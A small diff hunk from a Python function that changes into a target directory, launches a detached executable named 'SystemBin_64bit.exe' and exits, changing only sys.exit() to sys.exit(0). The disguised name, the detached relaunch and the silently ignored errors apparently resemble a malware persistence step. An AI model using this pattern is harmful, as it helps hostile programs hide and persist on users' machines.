@@ -55,7 +55,7 @@ def move():
         try:
             os.chdir(target_dir)
             subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
-            sys.exit()
+            sys.exit(0)
         except:
             pass
     except:
